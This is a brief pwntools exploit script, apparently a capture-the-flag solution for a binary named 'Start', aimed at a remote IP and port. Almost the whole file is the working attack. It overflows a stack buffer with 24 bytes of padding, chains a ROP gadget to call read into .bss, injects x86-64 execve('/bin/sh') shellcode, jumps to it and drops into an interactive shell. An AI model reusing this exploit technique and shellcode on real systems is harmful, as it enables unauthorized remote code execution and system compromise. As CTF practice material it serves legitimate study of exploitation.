from pwn import *

pop_rsi_r15_ret = 0x4005c1
read = 0x400400
bss_addr = 0x601038

local = False
if local:
    r = process('./Start_7712e67a188d9690eecbd0c937dfe77dd209f254')
    pause()
else:
    r = remote('139.59.114.220', 10001)

shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

r.sendline('A'*24 + p64(pop_rsi_r15_ret) + p64(bss_addr) + p64(0) + p64(read) + p64(bss_addr+1) + shellcode)
pause()
r.sendline('A\xff\xe4')
r.interactive()
